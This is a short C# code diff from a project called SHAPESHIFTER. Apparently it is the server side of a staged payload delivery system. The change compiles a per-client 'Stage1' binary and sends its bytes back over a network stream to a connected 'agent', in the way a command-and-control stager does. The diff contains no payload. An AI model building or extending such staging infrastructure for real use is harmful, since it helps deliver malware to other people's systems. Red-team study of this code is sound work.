@@ -63,7 +63,8 @@ namespace SHAPESHIFTER
                             break;
                         }
 
-                        if (!Compiler.CompileStage1(clientId.ToString()))
+                        byte[] stage1 = Compiler.CompileStage1(clientId.ToString());
+                        if (stage1 == null)
                         {
                             Console.WriteLine("  [-] Failed to compile Stage1");
                             break;
@@ -71,9 +72,9 @@ namespace SHAPESHIFTER
 
                         //byte[] msg = System.Text.Encoding.ASCII.GetBytes(data);
 
-                        //// Send back a response.
-                        //stream.Write(msg, 0, msg.Length);
-                        //Console.WriteLine("Sent: {0}", data);
+                        // Send back a response.
+                        stream.Write(stage1, 0, stage1.Length);
+                        Console.WriteLine("  [>] Sent {0} bytes back to the agent", stage1.Length);
                     }
 
                     // Shutdown and end connection
